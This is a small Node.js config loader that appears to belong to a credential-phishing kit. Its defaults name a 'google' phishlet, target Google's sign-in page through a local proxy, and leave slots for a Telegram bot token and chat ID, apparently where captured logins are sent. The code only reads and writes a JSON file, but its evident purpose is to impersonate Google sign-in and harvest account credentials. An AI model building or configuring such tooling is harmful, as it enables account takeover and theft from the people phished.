const fs = require('fs');
const path = require('path');

const configPath = path.join(__dirname, 'config.json');

function loadConfig() {
  try {
    if (fs.existsSync(configPath)) {
      return JSON.parse(fs.readFileSync(configPath, 'utf8'));
    }
    return {
      domain: '',
      ip: '127.0.0.1',
      target: 'https://accounts.google.com/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin',
      port: 1000,
      scheme: 'https',
      phishlet: 'google',
      telegramBotToken: '',
      telegramChatId: ''
    };
  } catch (error) {
    console.error(`error: ${error.message}`);
    return {};
  }
}

function saveConfig(config = loadConfig()) {
  try {
    fs.writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8');
  } catch (error) {
    console.error(`error save config: ${error.message}`);
  }
}

module.exports = { loadConfig, saveConfig };